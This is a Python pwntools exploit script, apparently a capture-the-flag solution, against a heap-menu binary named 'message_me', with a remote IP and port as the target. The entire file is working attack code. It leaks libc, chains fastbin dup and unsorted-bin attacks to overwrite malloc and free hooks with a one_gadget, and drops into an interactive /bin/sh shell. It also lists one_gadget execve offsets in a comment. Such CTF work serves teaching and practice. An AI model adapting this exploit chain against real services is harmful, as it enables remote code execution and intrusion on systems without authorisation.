from pwn import *
import sys

if len(sys.argv) == 1:
    p = process(["./message_me"])

else:
    p = remote("159.65.125.233", "6003")

context.binary = "./message_me"
binary = ELF("./message_me")

rv = [0x3, 0x6, 0x7, 0x5, 0x3, 0x5, 0x6, 0x2, 0x9, 0x1, 0x2, 0x7, 0, 0x9, 0x3, 0x6, 0, 0x6, 0x2, 0x6, 0x1, 0x8, 0x7, 0x9, 0x2, 0, 0x2, 0x3, 0x7, 0x5, 0x9, 0x2, 0x2, 0x8, 0x9, 0x7, 0x3, 0x6, 0x1, 0x2, 0x9, 0x3, 0x1, 0x9, 0x4, 0x7, 0x8, 0x4]

def alloc(size, msg):
    p.sendlineafter("choice : ", "0")
    p.sendlineafter("size : ", str(size))
    p.sendafter("meesage : ", msg)

def delete(idx):
    p.sendlineafter("choice : ", "1")
    p.sendlineafter("message : ", str(idx))

def show(idx):
    p.sendlineafter("choice : ", "2")
    p.sendlineafter("message : ", str(idx))

def chg(idx):
    p.sendlineafter("choice : ", "3")
    p.sendlineafter("message : ", str(idx))

alloc(0x80, "A" * 0x20)     # 0
alloc(0x80, "B" * 0x20)     # 1
alloc(0x80, "C" * 0x20)     # 2
alloc(0x60, p64(0x71) * 11)     # 3
'''
alloc(0x60, p64(0x71) * 11)     # 4
alloc(0x60, p64(0x71) * 11)     # 5
alloc(0x60, p64(0x71) * 11)     # 6
alloc(0x60, p64(0x71) * 11)     # 7
alloc(0x60, p64(0x71) * 11)     # 8
alloc(0x60, p64(0x71) * 11)     # 9
'''
# fastbin dup attack -> size overwrite -> chunk overlapping -> fastbin fd overwrite -> malloc_hook

delete(0)
delete(2)
show(2)

p.recvuntil("Message : ")
libc = u64(p.recv(6).ljust(8, "\x00"))
libc_base = libc - 0x3c4bf8
hook = libc_base + 0x3c4aed
system = libc_base + 0x45390
print hex(libc)
print hex(libc_base)

alloc(0x80, "D" * 0x20)     # smallbin clear
alloc(0x60, "D" * 0x20)     # smallbin clear

alloc(0x60, p64(0xdeadbeef) * 2 + p64(0x71) * 9)     # 4
alloc(0x60, p64(0x71) + p64(hook) + p64(0x71) * 9)     # 5        # attack
alloc(0x60, p64(0xcafebabe) * 2 + p64(0x71) * 9)     # 6
alloc(0x60, p64(0x71) * 11)     # 7
alloc(0x60, p64(0x71) * 11)     # 8
alloc(0x60, p64(0x71) * 11)     # 9
alloc(0x60, p64(0x71) * 9 + p64(0) + p64(0x71))     # 10 + 2       # unsorted bin attack vector
alloc(0x80, p64(0x71) + p64(0xc0d3c0da) + p64(0x71) * 9)     # 11 + 2
alloc(0x60, p64(0x71) + p64(0xc0d3c0db) + p64(0x71) * 9)     # 12 + 2
alloc(0x60, p64(0x71) + p64(0xc0d3c0dc) + p64(0x71) * 9)     # 13 + 2
alloc(0x60, p64(0x71) + p64(0xc0d3c0dd) + p64(0x71) * 9)     # 14 + 2

########## unsorted bin attack

delete(13)
delete(11)
delete(12)
delete(11)

ts = 0
for i in rv:
    print i
    chg(11)
    ts += i
    if ts % 0x10 == 0 and ts != 0x10:
        break
print ts

freehook_near = libc_base + 0x3c67a8 - 0x30
alloc(0x60, p64(0x71) * 11)     # None
alloc(0x60, "B" * 0x10 + p64(0x91) + p64(0xddaa) + p64(freehook_near - 0x20))     # None
delete(4)

pause()

########## hook overwrite

delete(6)
delete(7)
delete(6)

ts = 0
for i in rv:
    print i
    chg(6)
    ts += i
    if ts % 0x10 == 0:
        break
print ts

'''
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

alloc(0x60, p64(0x71) * 11)     # None
alloc(0x60, p64(0x71) * 11)     # None
alloc(0x60, "A" * 0x3 + p64(libc_base + 0x45261) * 2)     # None

p.sendline("0")
p.sendline("100")

########## hook overwrite done

p.interactive()
